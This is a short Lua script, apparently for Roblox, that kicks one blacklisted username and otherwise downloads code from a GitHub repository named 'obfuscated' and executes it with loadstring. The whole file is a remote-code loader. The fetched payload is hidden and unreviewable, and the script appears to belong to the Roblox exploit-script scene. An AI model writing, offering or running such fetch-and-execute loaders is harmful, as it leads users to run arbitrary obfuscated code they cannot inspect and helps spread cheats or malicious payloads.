local blacklist = {
  "whoareyiu24" 
}

if table.find(blacklist, player.Name) then
  game.Players.LocalPlayer:Kick('Test!')
else
  loadstring(game:HttpGet('https://github.com/SxripterRar/obfuscated/blob/main/probably%20not%20ssp?raw=true'))()
end
